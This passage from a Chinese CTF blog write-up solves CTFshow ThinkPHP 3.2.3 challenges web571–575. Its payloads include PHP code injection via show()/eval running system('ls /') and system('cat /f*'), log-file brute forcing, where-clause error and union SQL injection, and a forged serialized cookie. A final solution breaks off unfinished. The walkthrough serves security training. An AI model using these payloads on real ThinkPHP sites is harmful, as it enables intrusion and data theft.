<span class="token string single-quoted-string">'DEFAULT_FILTER'</span>        <span class="token operator">=></span> <span class="token string single-quoted-string">'htmlspecialchars'</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 	<span class="token comment">// 等同于 htmlspecialchars($_GET['name'])</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>其余的自己看文档吧</p>
<hr>
<h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>审计代码</p>
<p>先看一下Home模块下的控制器IndexController.class.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;style type="text/css">*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style>&lt;div style="padding: 24px 48px;"> &lt;h1>CTFshow&lt;/h1>&lt;p>thinkphp 专项训练&lt;/p>&lt;p>hello,'</span><span class="token operator">.</span><span class="token variable">$n</span><span class="token operator">.</span><span class="token string single-quoted-string">'黑客建立了控制器后门，你能找到吗&lt;/p>'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现这里实际上会接受一个参数n来调用show方法，这个方法是一个保留方法</p>
<h3 id="show方法渲染内容"><a href="#show方法渲染内容" class="headerlink" title="show方法渲染内容"></a>show方法渲染内容</h3><blockquote>
<p>如果没有定义任何模板文件，或者把模板内容存储到数据库中的话，就需要使用show方法来渲染输出了</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'渲染内容'</span><span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'字符编码'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'输出类型'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">// 例：</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'text/xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>show方法中的内容也可以支持模板解析</p>
<p>把Application文件丢到本地环境调试一下：</p>
<p>动态跟踪show方法</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221231514458.png" alt="image-20231221231514458"></p>
<p>一路跟踪display方法</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221231634150.png" alt="image-20231221231634150"></p>
<p>继续跟踪到fetch方法</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221225742960.png" alt="image-20231221225742960"></p>
<p>可以发现这个方法中存在命令执行的部分</p>
<p>我们传入的n也就是content在<code>TMPL_ENGINE_TYPE</code>是php的情况下会进到eval函数中</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 使用PHP原生模板</span>
    <span class="token variable">$_content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token comment">// 模板阵列变量分解成为独立变量</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 直接载入PHP模板</span>
    <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">include</span> <span class="token variable">$templateFile</span> <span class="token punctuation">:</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span> <span class="token operator">.</span> <span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>怎么让<code>TMPL_ENGINE_TYPE</code>为php呢，这里琢磨了一圈发现原来题目靶机的<code>TMPL_ENGINE_TYPE</code>是php，而我们本地能够命令执行则是因为生成的缓存文件被include了，要改也很简单，在 ThinkPHP&#x2F;Conf&#x2F;convention.php 把<code>TMPL_ENGINE_TYPE</code>的键值改成php即可</p>
<p>那么最终的payload就是：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http://050f2deb-9b96-4fe6-b5df-5af1c67aa8ce.challenge.ctf.show/index.php/home/index/index?n=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="web572（日志泄露）"><a href="#web572（日志泄露）" class="headerlink" title="web572（日志泄露）"></a>web572（日志泄露）</h1><p>版本3.2.3</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">hello,没有源码，如何获取黑客的蛛丝马迹？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这题没给源码，猜测存在信息泄露</p>
<h2 id="日志泄露"><a href="#日志泄露" class="headerlink" title="日志泄露"></a>日志泄露</h2><blockquote>
<p>thinkphp在开启DEBUG的情况下会在Runtime目录下生成日志</p>
</blockquote>
<p>入口文件中可以开启调试模式：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 开启调试模式</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'APP_DEBUG'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ThinkPHP3的日志一般会生成的位置</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/Runtime/Logs/
/App/Runtime/Logs/
/Application/Runtime/Logs/Admin/
/Application/Runtime/Logs/Home/
/Application/Runtime/Logs/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而ThinkPHP5会生成在<code>/runtime/log/202105/17.log</code></p>
<h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>那么我们要做的就是，抓包直接爆破这个日志的日期</p>
<p>先访问当天的日志，测试发现在&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;下</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231222124806690.png" alt="image-20231222124806690"></p>
<p>设置一下爆破的格式（题目告诉我们爆破不超过365次）</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231222124822263.png" alt="image-20231222124822263"></p>
<p>更改年份多爆几次，最后得到另一个日志的日期为21_04_15</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231222125201524.png" alt="image-20231222125201524"></p>
<p>可以看到这里的日志内容是进行了一次命令执行</p>
<p>我们尝试复现一下</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231222125424301.png" alt="image-20231222125424301"></p>
<p>那么我们的payload就是</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">/index.php?showctf=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="web573（sql注入）"><a href="#web573（sql注入）" class="headerlink" title="web573（sql注入）"></a>web573（sql注入）</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">hello user1,get id =1？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>参数是id，用where注入即可，分析参考我的另一篇文章：<a href="https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#where%E6%B3%A8%E5%85%A5">https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#where%E6%B3%A8%E5%85%A5</a></p>
<p>我这里用报错注入</p>
<p>查数据库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>返回ctfshow</p>
<p>查表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>返回ctfshow_users,flags</p>
<p>查列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flags'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>返回id,flag4s</p>
<p>查字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag4s <span class="token keyword">from</span> flags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>截取</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag4s <span class="token keyword">from</span> flags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>于是得到flag</p>
<p>或者直接联合注入也可以</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span>id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span>id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flags'</span><span class="token operator">%</span><span class="token number">23</span>
?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span>id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag4s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> flags<span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web574"><a href="#web574" class="headerlink" title="web574"></a>web574</h1><p>index改成了下面这样</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id='</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>和上题的区别是这里先用<code>where</code>进行查询，然后用<code>find</code>读取数据</p>
<h2 id="本地调试分析"><a href="#本地调试分析" class="headerlink" title="本地调试分析"></a>本地调试分析</h2><p>本地调试一下（我没准备渲染文件所以这里<code>$this-&gt;show($html)</code>要直接换成<code>var_dump($name)</code>）</p>
<p>依旧是用<code>1&#39;</code>做测试</p>
<p>一路跟到<code>ThinkPHP\Library\Think\Model.class.php:1998</code>的 where 方法这里</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240305170137011.png" alt="image-20240305170137011"></p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240305170449895.png" alt="image-20240305170449895"></p>
<p>发现只执行了两个部分</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">''</span> <span class="token operator">!=</span> <span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$map</span>            <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$map</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_string'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>
    <span class="token variable">$where</span>          <span class="token operator">=</span> <span class="token variable">$map</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>即<code>$this-&gt;options[&#39;where&#39;]=array(&quot;_string&quot;=&gt;&quot;1&#39;&quot;)</code></p>
<p>然后继续跟进，到ThinkPHP\Library\Think\Db\Driver.class.php:536的 parseWhere 方法</p>
<p>此时传入的<code>$where</code>就是我们<code>$this-&gt;options[&#39;where&#39;]</code>的值也就是<code>array(&quot;_string&quot;=&gt;&quot;1&#39;&quot;)</code>。所以我们会进入下面的if</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240305171345985.png" alt="image-20240305171345985"></p>
<p>可以看到此时的<code>$key</code>是<code>&quot;_string&quot;</code> <code>$val</code>是<code>id=1&#39;</code></p>
<p>进入ThinkPHP\Library\Think\Db\Driver.class.php:681的<code>parseThinkWhere</code>方法</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240305171638096.png" alt="image-20240305171638096"></p>
<p>可以发现这里return的时候有一个括号包裹，即返回的内容是<code>( id=1 )</code></p>
<p>接下来执行的sql语句为</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>think_user<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> <span class="token punctuation">(</span> id<span class="token operator">=</span><span class="token number">1</span>' <span class="token punctuation">)</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240305171854744.png" alt="image-20240305171854744"></p>
<p>这下懂了，只需要把括号闭合即可实现注入</p>
<h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>有了上面的分析，接下来就是直接打sql注入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flags'</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag4s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> flags<span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240305172306352.png" alt="image-20240305172306352"></p>
<p>这题也可以直接用报错注入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag4s<span class="token punctuation">)</span> <span class="token keyword">from</span> flags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="web575"><a href="#web575" class="headerlink" title="web575"></a>web575</h1><p>这题的index代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$user</span> <span class="token operator">||</span> <span class="token variable">$user</span><span class="token operator">-></span><span class="token property">id</span><span class="token operator">!==</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的<code>find</code>方法里面有 intval 直接转换类型，导致sql注入不了</p>
<h2 id="解法一：show方法命令执行"><a href="#解法一：show方法命令执行" class="headerlink" title="解法一：show方法命令执行"></a>解法一：show方法命令执行</h2><p>在web571中，我们知道<code>show</code>方法是可以执行php代码的</p>
<p>所以我们只需要能控制<code>$user-&gt;username</code>即可，随便传个id，不需要进if判断</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>	<span class="token comment">// get传入的id也要相同</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system('cat /f*');?>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240305224042419.png" alt="image-20240305224042419"></p>
<h2 id="解法二：thinkphp3-2-3反序列化"><a href="#解法二：thinkphp3-2-3反序列化" class="headerlink" title="解法二：thinkphp3.2.3反序列化"></a>解法二：thinkphp3.2.3反序列化</h2><p>分析依旧在隔壁文章，这里猜数据库名为 ctfshow，账密为 root:root</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

